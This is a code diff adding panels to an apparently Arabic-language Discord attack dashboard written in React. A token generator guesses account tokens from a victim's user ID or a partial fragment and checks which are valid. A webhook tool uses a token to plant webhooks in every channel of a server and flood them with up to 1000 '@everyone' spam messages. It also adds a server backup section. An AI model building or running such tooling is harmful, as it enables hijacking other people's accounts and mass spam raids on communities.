+                <div className="mb-4"><label className="text-[11px] text-purple-300/70 mb-1 block">🔢 عدد التوكنات (1-200)</label><input type="number" value={tgCount} onChange={e => setTgCount(Math.min(Math.max(Number(e.target.value), 1), 200))} min={1} max={200} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-purple-400/50 transition-colors" /></div>
+
+                <div className="flex gap-2 mb-4">
+                  {[{ id: 'random' as const, label: '🎲 عشوائي كامل', desc: 'ولّد من الصفر' }, { id: 'userid' as const, label: '👤 من أيدي حساب', desc: 'نصف توكن ذكي' }, { id: 'fragment' as const, label: '🧩 إكمال جزء', desc: 'أكمل الناقص' }].map(mode => (
+                    <button key={mode.id} onClick={() => { if (tgRunning) stopTgGeneration(); setTgMode(mode.id); setTgResults([]); setTgHalfToken(''); setTgStats(null); setTgFragmentAnalysis(null); setResult('') }} className={`flex-1 p-3 rounded-xl transition-all cursor-pointer border ${tgMode === mode.id ? 'bg-purple-500/20 text-purple-400 border-purple-500/30' : 'bg-white/3 text-white/40 border-white/10 hover:bg-white/5'}`}>
+                      <div className="text-xs font-bold">{mode.label}</div>
+                      <div className="text-[9px] mt-0.5 opacity-60">{mode.desc}</div>
+                    </button>
+                  ))}
+                </div>
+                {tgMode === 'userid' && (<>
+                  <TextInput label="👤 أيدي الحساب (Discord User ID)" value={tgUserId} onChange={setTgUserId} placeholder="مثال: 123456789012345678" accent="purple" />
+                  <div className="bg-purple-500/5 rounded-xl p-3 mb-4 border border-purple-500/10"><p className="text-[11px] text-purple-400/80">💡 ضع أيدي الحساب و الموقع تولّد نصف التوكن و تكمل الباقي بأنماط ذكية مختلفة - تتولّد لما لا نهائي لحد ما تضغط إيقاف</p></div>
+                  {tgHalfToken && (<div className="bg-cyan-500/5 rounded-lg p-2.5 border border-cyan-500/15 mb-3 flex items-center gap-2"><span className="text-[10px] text-cyan-300">نصف التوكن:</span><code className="text-[10px] text-cyan-400 font-mono truncate flex-1">{tgHalfToken}.</code><button onClick={() => { navigator.clipboard.writeText(tgHalfToken).catch(() => {}) }} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2 py-1 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer flex-shrink-0">📋</button></div>)}
+                </>)}
+                {tgMode === 'fragment' && (<>
+                  <div className="mb-4"><label className="text-[11px] text-white/50 mb-1 block">🧩 جزء من التوكن (ضع أي جزء تعرفه)</label><textarea value={tgFragment} onChange={e => setTgFragment(e.target.value)} placeholder={'ضع أي جزء من التوكن هنا...\n\nمثال:\n• النصف الأول: Njg2OTI4NTk...\n• نصفين مع نقطة: Njg2OTI4NTk.MTc1NT\n• الجزء الأخير (hex): a3f8b2c1d4e5...\n• النصف الأول فقط: Njg2OTI4NTk.'} rows={4} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-xs placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 resize-none transition-colors font-mono" /></div>
+                  <div className="bg-amber-500/5 rounded-xl p-3 mb-4 border border-amber-500/10"><p className="text-[11px] text-amber-400/80">💡 الموقع ذكي جداً - تقرأ الجزء و تفهم أي جزء من التوكن وضعته و تكمل الباقي بأنماط مختلفة لحد ما تجد صالح أو توقفها</p></div>
+                  {tgFragmentAnalysis && (<div className="bg-cyan-500/5 rounded-xl p-3 mb-3 border border-cyan-500/15 animate-fade-in">
+                    <div className="flex items-center justify-between mb-2"><div className="text-[11px] text-cyan-300 font-bold">🧠 تحليل ذكي متقدم</div><div className={`text-[9px] px-2 py-0.5 rounded-full border ${tgFragmentAnalysis.confidence >= 80 ? 'bg-green-500/10 text-green-400 border-green-500/20' : tgFragmentAnalysis.confidence >= 50 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>ثقة {tgFragmentAnalysis.confidence}%</div></div>
+                    <div className="text-[10px] text-cyan-400/90 mb-1 font-medium">{tgFragmentAnalysis.analysis}</div>
+                    <div className="text-[9px] text-cyan-500/50 mb-2">{tgFragmentAnalysis.detail}</div>
+                    <div className="grid grid-cols-3 gap-1.5 mb-2">
+                      <div className={`rounded-lg p-1.5 text-center text-[9px] border ${tgFragmentAnalysis.hasPart1 ? (tgFragmentAnalysis.partialPart1 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20') : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{tgFragmentAnalysis.hasPart1 ? (tgFragmentAnalysis.partialPart1 ? '⚠️' : '✅') : '❌'} User ID</div>
+                      <div className={`rounded-lg p-1.5 text-center text-[9px] border ${tgFragmentAnalysis.hasPart2 ? (tgFragmentAnalysis.partialPart2 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20') : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{tgFragmentAnalysis.hasPart2 ? (tgFragmentAnalysis.partialPart2 ? '⚠️' : '✅') : '❌'} Timestamp</div>
+                      <div className={`rounded-lg p-1.5 text-center text-[9px] border ${tgFragmentAnalysis.hasPart3 ? (tgFragmentAnalysis.partialPart3 ? 'bg-yellow-500/10 text-yellow-400 border-yellow-500/20' : 'bg-green-500/10 text-green-400 border-green-500/20') : 'bg-red-500/10 text-red-400 border-red-500/20'}`}>{tgFragmentAnalysis.hasPart3 ? (tgFragmentAnalysis.partialPart3 ? '⚠️' : '✅') : '❌'} Hex</div>
+                    </div>
+                    <div className="text-[9px] text-white/30 mb-1">الناقص: {tgFragmentAnalysis.missingParts.length > 0 ? tgFragmentAnalysis.missingParts.map((p: string) => p === 'P1' ? 'User ID' : p === 'P2' ? 'Timestamp' : p === 'P3' ? 'Hex' : p).join(' | ') : (tgFragmentAnalysis.partialPart1 || tgFragmentAnalysis.partialPart2 || tgFragmentAnalysis.partialPart3) ? 'أجزاء ناقصة تحتاج إكمال' : 'لا شيء'}</div>
+                    {tgFragmentAnalysis.userIDs && tgFragmentAnalysis.userIDs.length > 0 && (<div className="text-[9px] text-green-400/70 mt-1">User ID: {tgFragmentAnalysis.userIDs.join(', ')}</div>)}
+                    {tgFragmentAnalysis.timestamps && tgFragmentAnalysis.timestamps.length > 0 && (<div className="text-[9px] text-blue-400/70 mt-0.5">Timestamp: {tgFragmentAnalysis.timestamps.join(', ')}</div>)}
+                  </div>)}
+                </>)}
+                <div className="grid grid-cols-2 gap-2.5">
+                  <ActionBtn text={tgRunning ? '⏳ جاري...' : '🎲 توليد التوكنات'} loading={tgRunning} color="purple" onClick={async () => {
+                    if (tgMode === 'userid' && (!tgUserId.trim() || tgUserId.trim().length < 17)) { setResult('❌ أدخل أيدي الحساب (17 رقم على الأقل)'); return }
+                    if (tgMode === 'fragment' && (!tgFragment.trim() || tgFragment.trim().length < 3)) { setResult('❌ ضع جزء من التوكن (3 أحرف على الأقل)'); return }
+                    setResult(''); setTgResults([]); setTgHalfToken(''); setTgStats(null); setTgFragmentAnalysis(null); setCheckerResults([]); setCheckerStats(null)
+                    setTgRunning(true); setLoading(true); setProgress('🎰 جاري توليد التوكنات...')
+                    try {
+                      const bodyObj: any = { action: tgMode === 'random' ? 'generate-only' : tgMode, count: tgCount }
+                      if (tgMode === 'userid') { bodyObj.action = 'generate-only'; bodyObj.userId = tgUserId }
+                      if (tgMode === 'fragment') { bodyObj.action = 'generate-only'; bodyObj.fragment = tgFragment }
+                      const res = await fetch('/api/token-generator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(bodyObj) })
+                      const contentType = res.headers.get('content-type') || ''
+                      if (contentType.includes('application/json')) {
+                        const data = await res.json()
+                        if (data.success && data.tokens) {
+                          setTgResults(data.tokens.map((t: any) => ({ token: t.token, valid: false, info: `Length: ${t.length}`, index: t.index })))
+                          setTgStats({ total: data.tokens.length, checked: 0, valid: 0, invalid: 0, skipped: 0, speed: '0/s' })
+                          setResult(`✅ تم توليد ${data.tokens.length} توكن بنجاح!`)
+                        } else if (data.error) { setResult('❌ ' + data.error) }
+                      } else {
+                        // SSE mode (for old stream modes)
+                        const reader = res.body?.getReader()
+                        if (!reader) { setResult('❌ خطأ'); setTgRunning(false); setLoading(false); setProgress(''); return }
+                        const decoder = new TextDecoder(); let buffer = ''
+                        while (true) {
+                          const { done, value } = await reader.read()
+                          if (done) break
+                          buffer += decoder.decode(value, { stream: true })
+                          const lines = buffer.split('\n'); buffer = lines.pop() || ''
+                          for (const line of lines) {
+                            if (!line.startsWith('data: ')) continue
+                            try {
+                              const event = JSON.parse(line.substring(6))
+                              if (event.type === 'halfToken') setTgHalfToken(event.halfToken)
+                              else if (event.type === 'fragmentAnalysis') setTgFragmentAnalysis(event.analysis)
+                              else if (event.type === 'result') {
+                                setTgResults(prev => [event.data, ...prev].slice(0, 200))
+                                if (event.stats) setTgStats(event.stats as any)
+                              }
+                            } catch {}
+                          }
+                        }
+                      }
+                    } catch (e: any) { setResult('❌ خطأ في الاتصال') }
+                    setTgRunning(false); setLoading(false); setProgress('')
+                  }} />
+                  {tgResults.length > 0 && !tgRunning && (
+                    <ActionBtn text="🔍 فحص التوكنات" loading={loading} color="green" onClick={async () => {
+                      if (tgResults.length === 0) { setResult('❌ لا توجد توكنات للفحص'); return }
+                      setLoading(true); setProgress('🔍 جاري فحص التوكنات...'); setResult('')
+                      try {
+                        const tokensToCheck = tgResults.map(r => r.token)
+                        const res = await fetch('/api/token-checker', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ tokens: tokensToCheck }) })
+                        const data = await res.json()
+                        if (data.success) {
+                          setCheckerResults(data.results)
+                          if (data.stats) setCheckerStats(data.stats)
+                          setResult(`✅ تم فحص ${data.stats.total} توكن | ✅ صالح: ${data.stats.valid} | ❌ غير صالح: ${data.stats.invalid}`)
+                          // Update tgResults with validity
+                          setTgResults(prev => prev.map(r => {
+                            const found = data.results.find((c: any) => c.token.includes(r.token.substring(0, 10)))
+                            return { ...r, valid: found?.valid || false }
+                          }))
+                        } else { setResult('❌ ' + (data.error || 'فشل الفحص')) }
+                      } catch { setResult('❌ خطأ في الاتصال') }
+                      setLoading(false); setProgress('')
+                    }} />
+                  )}
+                </div>
+                {tgStats && tgStats.total > 0 && (<div className="mt-3 grid grid-cols-3 gap-1.5">
+                  <div className="bg-purple-500/8 rounded-lg p-2 border border-purple-500/15 text-center"><div className="text-base font-black text-purple-400">{tgStats.total}</div><div className="text-[8px] text-purple-300/50">مولّد</div></div>
+                  {checkerStats && (<>
+                    <div className="bg-green-500/8 rounded-lg p-2 border border-green-500/15 text-center"><div className="text-base font-black text-green-400">{checkerStats.valid}</div><div className="text-[8px] text-green-300/50">صالح</div></div>
+                    <div className="bg-red-500/8 rounded-lg p-2 border border-red-500/15 text-center"><div className="text-base font-black text-red-400">{checkerStats.invalid}</div><div className="text-[8px] text-red-300/50">خاطئ</div></div>
+                  </>)}
+                </div>)}
+                {tgResults.length > 0 && (<div className="mt-4 space-y-1.5 max-h-72 overflow-y-auto">
+                  <div className="text-[11px] text-white/30 mb-2 sticky top-0 bg-[#0d1117] py-1">📋 {tgResults.length} توكن:</div>
+                  {tgResults.slice(0, 200).map((r, i) => (
+                    <div key={r.index || i} className={`flex items-center gap-2 p-2 rounded-lg text-[11px] font-mono border animate-fade-in ${r.valid ? 'bg-green-500/15 border-green-500/30 ring-1 ring-green-500/20' : 'bg-white/3 border-white/5'}`}>
+                      <span className="flex-shrink-0 text-xs">{r.valid ? '✅' : '⏳'}</span>
+                      <code className="flex-1 text-white/60 break-all leading-relaxed" style={{wordBreak:'break-all',fontSize:'10px'}}>{r.token}</code>
+                      <button onClick={() => { navigator.clipboard.writeText(r.token).catch(() => {}) }} className="text-[10px] text-purple-400 bg-purple-500/10 px-1.5 py-0.5 rounded border border-purple-500/20 hover:bg-purple-500/20 transition-colors cursor-pointer flex-shrink-0">📋</button>
+                    </div>
+                  ))}
+                </div>)}
+              </div></div>
+            )}
+
+            {/* ==================== WEBHOOK CREATOR - محسّن v2 ==================== */}
+            {section === 'webhook-creator' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-cyan-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔗</span><h2 className="text-xl font-black text-cyan-400">إنشاء ويب هوكات متقدمة</h2></div>
+                <p className="text-slate-500 text-sm mb-5">إنشاء ويب هوكات في كل رومات السيرفر + سبام مباشر + Embed + خيارات متقدمة</p>
+                <TokenInput label="🎫 التوكن" value={whCreateToken} onChange={setWhCreateToken} accent="cyan" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🏰 أيدي السيرفر" value={whCreateGuildId} onChange={setWhCreateGuildId} placeholder="Server ID" accent="cyan" />
+
+                {/* جلب الرومات */}
+                <button onClick={async () => {
+                  if (!whCreateToken || !whCreateGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }
+                  setLoading(true); setProgress('🔍 جاري جلب الرومات...'); setResult('')
+                  try {
+                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken, guildId: whCreateGuildId, action: 'fetch-channels' }), signal: AbortSignal.timeout(30000) })
+                    const data = await res.json()
+                    if (data.success) { setWhChannels(data.channels); setWhSelectedChannels(data.channels.map((c: {id: string}) => c.id)); setResult(`✅ تم جلب ${data.count} روم نصي`); setStats({}) }
+                    else { setResult('❌ ' + (data.error || 'فشل جلب الرومات')) }
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} className="w-full mb-5 py-3 rounded-xl text-sm font-bold bg-cyan-500/10 text-cyan-400 border border-cyan-500/30 hover:bg-cyan-500/20 transition-all cursor-pointer">🔍 جلب رومات السيرفر</button>
+
+                {/* عرض الرومات */}
+                {whChannels.length > 0 && (<div className="mb-5 bg-black/20 rounded-xl p-4 border border-cyan-500/15">
+                  <div className="flex items-center justify-between mb-3">
+                    <span className="text-xs font-bold text-cyan-400">📺 الرومات النصية ({whChannels.length})</span>
+                    <div className="flex gap-2">
+                      <button onClick={() => setWhSelectedChannels(whChannels.map(c => c.id))} className="text-[10px] text-green-400 bg-green-500/10 px-2 py-1 rounded-lg border border-green-500/20 hover:bg-green-500/20 transition-colors cursor-pointer">تحديد الكل</button>
+                      <button onClick={() => setWhSelectedChannels([])} className="text-[10px] text-red-400 bg-red-500/10 px-2 py-1 rounded-lg border border-red-500/20 hover:bg-red-500/20 transition-colors cursor-pointer">إلغاء الكل</button>
+                    </div>
+                  </div>
+                  <div className="max-h-40 overflow-y-auto space-y-1">
+                    {whChannels.map(ch => (
+                      <label key={ch.id} className={`flex items-center gap-2 p-2 rounded-lg cursor-pointer transition-all ${whSelectedChannels.includes(ch.id) ? 'bg-cyan-500/10 border border-cyan-500/20' : 'bg-black/10 border border-transparent hover:bg-white/3'}`}>
+                        <input type="checkbox" checked={whSelectedChannels.includes(ch.id)} onChange={e => {
+                          if (e.target.checked) setWhSelectedChannels([...whSelectedChannels, ch.id])
+                          else setWhSelectedChannels(whSelectedChannels.filter(id => id !== ch.id))
+                        }} className="accent-cyan-500 w-3.5 h-3.5" />
+                        <span className="text-[11px] text-cyan-300">#{ch.name}</span>
+                        <span className="text-[9px] text-white/20 font-mono ml-auto">{ch.id}</span>
+                      </label>
+                    ))}
+                  </div>
+                </div>)}
+
+                {/* اختيار الوضع */}
+                <div className="flex gap-2 mb-5">
+                  {[{ key: 'create' as const, label: '🔗 إنشاء فقط', icon: '🔗' }, { key: 'spam' as const, label: '🔥 إنشاء + سبام', icon: '🔥' }, { key: 'existing' as const, label: '📡 سبام موجود', icon: '📡' }].map(mode => (
+                    <button key={mode.key} onClick={() => setWhCreateMode(mode.key)} className={`flex-1 py-3 rounded-xl text-xs font-bold transition-all cursor-pointer border ${whCreateMode === mode.key ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30 shadow-lg shadow-cyan-500/5' : 'bg-black/20 text-cyan-600 hover:text-cyan-400 border-transparent'}`}>{mode.icon} {mode.label}</button>
+                  ))}
+                </div>
+
+                {/* خيارات الإنشاء */}
+                {(whCreateMode === 'create' || whCreateMode === 'spam') && (<div className="bg-black/20 rounded-xl p-4 border border-cyan-500/15 mb-5">
+                  <h3 className="text-xs font-bold text-cyan-400 mb-3">⚙️ خيارات الإنشاء</h3>
+                  <div className="grid grid-cols-2 gap-3">
+                    <div><label className="text-[11px] text-cyan-300/70 mb-1 block">📝 اسم الويب هوك</label><input type="text" value={whCreateName} onChange={e => setWhCreateName(e.target.value)} className="w-full bg-black/30 border border-cyan-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-400/50 transition-colors" /></div>
+                    <div><label className="text-[11px] text-cyan-300/70 mb-1 block">🔢 عدد لكل روم (max 10)</label><input type="number" value={whCreateCount} onChange={e => setWhCreateCount(Math.min(Math.max(Number(e.target.value), 1), 10))} className="w-full bg-black/30 border border-cyan-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-cyan-400/50 transition-colors" /></div>
+                  </div>
+                </div>)}
+
+                {/* خيارات السبام */}
+                {(whCreateMode === 'spam' || whCreateMode === 'existing') && (<div className="bg-orange-500/5 rounded-xl p-4 border border-orange-500/15 mb-5">
+                  <h3 className="text-xs font-bold text-orange-400 mb-3">🔥 خيارات السبام</h3>
+                  <div className="mb-3"><label className="text-[11px] text-orange-300/70 mb-1 block">💬 محتوى الرسالة</label><textarea value={whCrSpamMessage} onChange={e => setWhCrSpamMessage(e.target.value)} placeholder="@everyone رسالتك هنا" rows={2} className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none transition-colors" /></div>
+                  <div className="grid grid-cols-2 gap-3">
+                    <div><label className="text-[11px] text-orange-300/70 mb-1 block">🔢 عدد الرسائل (max 1000)</label><input type="number" value={whCrSpamCount} onChange={e => setWhCrSpamCount(Math.min(Math.max(Number(e.target.value), 1), 1000))} className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
+                    <div><label className="text-[11px] text-orange-300/70 mb-1 block">👤 اسم المرسل (اختياري)</label><input type="text" value={whCrSpamUsername} onChange={e => setWhCrSpamUsername(e.target.value)} placeholder="TRJ BOT" className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
+                    <div className="col-span-2"><label className="text-[11px] text-orange-300/70 mb-1 block">🖼️ رابط Avatar (اختياري)</label><input type="text" value={whCrSpamAvatarUrl} onChange={e => setWhCrSpamAvatarUrl(e.target.value)} placeholder="https://cdn.discordapp.com/..." className="w-full bg-black/30 border border-orange-500/30 rounded-lg px-3 py-2 text-sm text-white font-mono placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
+                  </div>
+                </div>)}
+
+                {/* Embed خيارات */}
+                {(whCreateMode === 'spam' || whCreateMode === 'existing') && (<div className="bg-purple-500/5 rounded-xl p-4 border border-purple-500/15 mb-5">
+                  <div className="flex items-center justify-between mb-3">
+                    <h3 className="text-xs font-bold text-purple-400">🎨 Embed (اختياري)</h3>
+                    <button onClick={() => setWhEmbedEnabled(!whEmbedEnabled)} className={`text-[10px] px-3 py-1.5 rounded-lg border transition-all cursor-pointer ${whEmbedEnabled ? 'bg-purple-500/20 text-purple-300 border-purple-500/30' : 'bg-black/20 text-purple-600 border-transparent hover:text-purple-400'}`}>{whEmbedEnabled ? '✅ مفعّل' : '⬜ معطّل'}</button>
+                  </div>
+                  {whEmbedEnabled && (<div className="space-y-3">
+                    <div><label className="text-[11px] text-purple-300/70 mb-1 block">📝 عنوان Embed</label><input type="text" value={whEmbedTitle} onChange={e => setWhEmbedTitle(e.target.value)} placeholder="عنوان الرسالة" className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-400/50 transition-colors" /></div>
+                    <div><label className="text-[11px] text-purple-300/70 mb-1 block">📝 وصف Embed</label><textarea value={whEmbedDesc} onChange={e => setWhEmbedDesc(e.target.value)} placeholder="وصف الرسالة..." rows={2} className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 resize-none transition-colors" /></div>
+                    <div><label className="text-[11px] text-purple-300/70 mb-1 block">🎨 لون Embed (HEX)</label><input type="text" value={whEmbedColor} onChange={e => setWhEmbedColor(e.target.value)} placeholder="5865F2" className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white font-mono focus:outline-none focus:border-purple-400/50 transition-colors" /></div>
+                  </div>)}
+                </div>)}
+
+                {/* سبام في ويب هوكات موجودة */}
+                {whCreateMode === 'existing' && (<div className="mb-5"><label className="text-[11px] text-pink-300/70 mb-1 block">🔗 روابط الويب هوكات (كل سطر = رابط)</label><textarea value={whExistingUrls} onChange={e => setWhExistingUrls(e.target.value)} placeholder="https://discord.com/api/webhooks/...\nhttps://discord.com/api/webhooks/..." rows={3} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 resize-none font-mono transition-colors" /></div>)}
+
+                {/* أزرار التنفيذ */}
+                {whCreateMode === 'create' && (<ActionBtn text={`🔗 إنشاء في ${whSelectedChannels.length || 'كل'} روم`} loading={loading} color="cyan" onClick={async () => {
+                  if (!whCreateToken || !whCreateGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }
+                  setLoading(true); setProgress('🔗 جاري إنشاء الويب هوكات...'); setResult(''); setWhCreateResults([])
+                  try {
+                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken, guildId: whCreateGuildId, action: 'create-all', webhookName: whCreateName, createCount: whCreateCount, selectedChannelIds: whSelectedChannels }), signal: AbortSignal.timeout(300000) })
+                    const data = await res.json()
+                    if (data.success) { setResult(data.logs.join('\n')); setWhCreateResults(data.results); if (data.stats) setStats({ created: data.stats.created, failed: data.stats.failed }) }
+                    else { setResult('❌ ' + (data.error || 'فشل')) }
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />)}
+
+                {whCreateMode === 'spam' && (<ActionBtn text={`🔥 إنشاء + سبام في ${whSelectedChannels.length || 'كل'} روم`} loading={loading} color="orange" onClick={async () => {
+                  if (!whCreateToken || !whCreateGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }
+                  if (!whCrSpamMessage) { setResult('❌ أدخل الرسالة'); return }
+                  setLoading(true); setProgress('🔥 جاري إنشاء + سبام...'); setResult(''); setWhCreateResults([])
+                  try {
+                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken, guildId: whCreateGuildId, action: 'create-and-spam', webhookName: whCreateName, createCount: whCreateCount, selectedChannelIds: whSelectedChannels, spamMessage: whCrSpamMessage, spamCount: whCrSpamCount, spamUsername: whCrSpamUsername || undefined, spamAvatarUrl: whCrSpamAvatarUrl || undefined, embedTitle: whEmbedEnabled ? whEmbedTitle : undefined, embedDescription: whEmbedEnabled ? whEmbedDesc : undefined, embedColor: whEmbedEnabled ? whEmbedColor : undefined }), signal: AbortSignal.timeout(300000) })
+                    const data = await res.json()
+                    if (data.success) { setResult(data.logs.join('\n')); setWhCreateResults(data.results); if (data.stats) setStats({ created: data.stats.created, spam_sent: data.stats.spamSent, failed: data.stats.spamFailed }) }
+                    else { setResult('❌ ' + (data.error || 'فشل')) }
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />)}
+
+                {whCreateMode === 'existing' && (<ActionBtn text="📡 سبام في الويب هوكات الموجودة" loading={loading} color="pink" onClick={async () => {
+                  if (!whCrSpamMessage) { setResult('❌ أدخل الرسالة'); return }
+                  const urls = whExistingUrls.split('\n').map(u => u.trim()).filter(u => u.includes('discord.com/api/webhooks') || u.includes('discord.gg'))
+                  if (urls.length === 0) { setResult('❌ أدخل رابط ويب هوك واحد على الأقل'); return }
+                  setLoading(true); setProgress('📡 جاري السبام...'); setResult('')
+                  try {
+                    const res = await fetch('/api/webhook-creator', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: whCreateToken || '', guildId: '0', action: 'spam-existing', webhookUrls: urls, spamMessage: whCrSpamMessage, spamCount: whCrSpamCount, spamUsername: whCrSpamUsername || undefined, spamAvatarUrl: whCrSpamAvatarUrl || undefined, embedTitle: whEmbedEnabled ? whEmbedTitle : undefined, embedDescription: whEmbedEnabled ? whEmbedDesc : undefined, embedColor: whEmbedEnabled ? whEmbedColor : undefined }), signal: AbortSignal.timeout(300000) })
+                    const data = await res.json()
+                    if (data.success) { setResult(data.logs.join('\n')); if (data.stats) setStats({ sent: data.stats.sent, failed: data.stats.failed }) }
+                    else { setResult('❌ ' + (data.error || 'فشل')) }
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />)}
+
+                {/* عرض النتائج */}
+                {whCreateResults.length > 0 && (<div className="mt-4 space-y-1.5 max-h-64 overflow-y-auto">
+                  <div className="flex items-center justify-between mb-2">
+                    <span className="text-[11px] text-white/30">📋 الويب هوكات المنشأة:</span>
+                    <button onClick={() => {
+                      const allUrls = whCreateResults.map(r => r.url).join('\n')
+                      navigator.clipboard.writeText(allUrls).catch(() => {})
+                    }} className="text-[10px] text-green-400 bg-green-500/10 px-2.5 py-1 rounded-lg border border-green-500/20 hover:bg-green-500/20 transition-colors cursor-pointer">📋 نسخ الكل</button>
+                  </div>
+                  {whCreateResults.map((r, i) => (
+                    <div key={i} className="bg-cyan-500/5 rounded-lg p-2.5 border border-cyan-500/15 flex items-center gap-2">
+                      <span className="text-green-400 flex-shrink-0">✅</span>
+                      <div className="flex-1 min-w-0">
+                        <div className="text-[11px] text-cyan-300 font-bold">{r.name} {r.channelName ? <span className="text-white/30 font-normal">#{r.channelName}</span> : ''}</div>
+                        <div className="text-[10px] text-white/30 font-mono truncate">{r.url}</div>
+                      </div>
+                      <button onClick={() => { navigator.clipboard.writeText(r.url).catch(() => {}) }} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2 py-1 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer flex-shrink-0">📋</button>
+                    </div>
+                  ))}
+                </div>)}
+              </div></div>
+            )}
+
+            {/* ==================== SERVER BACKUP ==================== */}
+            {section === 'server-backup' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-emerald-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">💾</span><h2 className="text-xl font-black text-emerald-400">حفظ و استعادة سيرفر</h2></div>
+                <p className="text-slate-500 text-sm mb-4">حفظ نسخة احتياطية شاملة أو استعادة نسخة سابقة في أي سيرفر</p>
+                <TokenInput label="🎫 التوكن" value={backupToken} onChange={setBackupToken} accent="green" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🖥️ أيدي السيرفر" value={backupGuildId} onChange={setBackupGuildId} placeholder="Server ID" accent="green" />
+                <ActionBtn text="💾 إنشاء نسخة احتياطية" loading={loading} color="green" onClick={async () => { if (!backupToken || !backupGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }; setLoading(true); setProgress('📦 جاري إنشاء النسخة الاحتياطية...'); setResult(''); try { const res = await fetch('/api/server-backup', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: backupToken, guildId: backupGuildId, action: 'backup' }), signal: AbortSignal.timeout(300000) }); const data = await res.json(); if (data.success) { setResult(data.logs.join('\n')); if (data.backup) { const blob = new Blob([JSON.stringify(data.backup, null, 2)], { type: 'application/json' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `backup_${backupGuildId}_${Date.now()}.json`; a.click(); URL.revokeObjectURL(url) } } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+                <div className="mt-5 pt-4 border-t border-emerald-500/15">
+                  <h3 className="text-sm font-bold text-emerald-400 mb-2 flex items-center gap-2">🔄 استعادة نسخة احتياطية</h3>
+                  <p className="text-[11px] text-emerald-500/60 mb-3">الصق ملف JSON النسخة الاحتياطية أو اختر ملف ثم اضغط استعادة - سيتم إنشاء نفس الرومات و الرتب و الإيموجي في السيرفر المحدد</p>
+                  <textarea value={restoreData} onChange={e => setRestoreData(e.target.value)} placeholder="الصق محتوى ملف JSON النسخة الاحتياطية هنا..." rows={4} className="w-full bg-black/30 border border-emerald-500/30 rounded-xl px-4 py-3 text-white text-xs placeholder-emerald-700/30 focus:outline-none focus:border-emerald-400/50 resize-none transition-colors mb-3 font-mono" />
+                  <label className="flex items-center gap-2 text-xs text-emerald-400 bg-emerald-500/10 px-3 py-2 rounded-lg border border-emerald-500/20 cursor-pointer hover:bg-emerald-500/20 transition-colors mb-3 w-fit">
+                    <span>📁 اختر ملف JSON</span>
+                    <input type="file" accept=".json" className="hidden" onChange={e => { const file = e.target.files?.[0]; if (!file) return; const reader = new FileReader(); reader.onload = () => { if (typeof reader.result === 'string') setRestoreData(reader.result) }; reader.readAsText(file) }} />
+                  </label>
